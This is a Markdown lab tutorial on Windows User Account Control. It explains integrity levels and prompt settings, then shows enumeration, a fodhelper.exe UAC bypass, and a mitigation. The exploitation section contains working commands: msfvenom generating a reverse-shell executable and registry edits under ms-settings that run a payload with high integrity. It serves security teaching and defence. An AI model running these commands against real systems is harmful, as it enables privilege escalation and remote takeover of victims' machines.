## Description

UAC, or User Account Control, is a security feature implemented in Microsoft Windows operating systems, starting with Windows Vista. Its primary purpose is to enhance the security of the operating system by prompting users for permission or confirmation before allowing certain actions that may require administrative privileges.

When an application or a user attempts to perform tasks that require elevated permissions, such as installing software, making system changes, or modifying certain system settings, UAC prompts the user with a dialog box asking for confirmation or prompting the entry of administrator credentials. 

All protected objects in Windows are labeled with an integrity level. The default integrity level is medium, which is assigned to most users, system files, and registry keys on a system.

The following table illustrates the different levels of integrity:

| Integrity Name | Details |
|:-----------:|:-----------:|
| **Untrusted** | Processes logged in anonymously are automatically categorized as Untrusted. For instance, consider Google Chrome. |
| **Low** | The Low integrity level is the level used by default for interaction with the Internet. It's important to note that a process with a lower integrity level is restricted from writing to an object with a higher integrity level.|
| **Medium** | Processes initiated by standard users typically carry a medium integrity label, including those started by users within the administrators group. |
| **High** | Administrators are granted the High integrity level. Moreover, the root directory is safeguarded with a high-integrity label. |
| **System** | Most services are designated with System integrity. |
| **Installer** | The Installer integrity level is a unique case and represents the highest of all integrity levels. |

The default configuration for UAC is **Prompt for consent for non-Windows binaries**, but can also have different configuration settings.

The following table illustrates various configuration settings of UAC in a system:

| Prompt Name | Details |
|:-----------:|:-----------:|
| **Prompt for consent for non-Windows binaries** | This is the default. When an operation for a non-Microsoft application requires elevation of privilege, the user is prompted on the secure desktop to choose between **Permit** or **Deny**. If the user selects **Permit**, the operation continues with the user's highest available privilege. |
| **Prompt for credentials:** | An operation that requires elevation of privilege prompts the administrator to enter the user name and password. If the administrator enters valid credentials, the operation proceeds with the appropriate privilege. |
| **Prompt for consent:** | An operation that requires elevation of privilege prompts the administrator to select **Permit** or **Deny**. If the administrator selects **Permit**, the operation continues with the administrator's highest available privilege. |
| **Elevate without prompting** | Assumes that the administrator will permit an operation that requires elevation, and additional consent or credentials are not required. |

A UAC bypass refers a technique that allows a medium integrity process to elevate itself or spawn a new process in high integrity, without prompting the user for consent. 

:information_source: In this section, I will present only one example of a UAC bypass, as there are numerous different UAC bypass techniques. 

## Lab Setup

### Manual Lab Setup

Open a cmd with local Administrator privileges and use the following command:

```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0x1 /f
```

Outcome:

### PowerShell Script Lab Setup

To set up the lab with the 'UAC' feature is by using the custom PowerShell script named [EnableUAC.ps1](/Lab-Setup-Scripts/EnableUAC.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\EnableUAC.ps1
```

Outcome:

## Enumeration

### Manual Enumeration

To perform manual enumeration and identify whether a Windows workstation has enabled UAC, you can use the following command from a command prompt:

```
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Outcome:

### Tool Enumeration

To run the SharpUp tool and perform an enumeration if the `UAC` feature is enabled, you can execute the following command with appropriate argument:

```
SharpUp.exe audit
```

## Exploitation

:information_source: This case study leverages a UAC384 bypass that abuses the `Fodhelper.exe` application.

To abuse this scenario you should follow these steps:

1)  Use msfvenom to generate a malicious executable (exe) file:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > nikos.exe
```

2) Transfer the malicious executable file to victim's machine.

3) Open a listener on your Kali machine.

4) Create with the following PowerShell command a new registry key:

```
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
```

5) Create a new registry entry named "DelegateExecute" under the specified registry path with an empty string as the value:

```
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
```

6) Modify the default command which executed when the specified registry key is triggered:

```
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -c C:\<full_path>\<binary.exe>" -Force
```

Outcome:

![UAC-Exploitation-1](/Pictures/UAC-Exploitation-1.png)

7) Execute the `fodhelper.exe`:

```
C:\Windows\System32\fodhelper.exe
```

8) Verify the new reverse shell from your attacking machine with High Integrity:

## Mitigation

To defend against UAC bypass, it is highly recommended to utilize the `Prompt for credentials` concept in UAC configuration settings and keep update your system.

In order to set up this follow these steps:

1) Open a Powershell with local Administartor privileges and run the following command:

```
secpol.msc
```

2) In the Local Security Policy window, go to **Security Settings** -> **Local Policies** -> **Security Options**.

3) Look for the setting named **User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode** and double-click on it to open its properties.

4) In the properties window, select the desired option. In this case, choose the option that says "Prompt for credentials".

Outcome:

5) Verify the new UAC configuration:
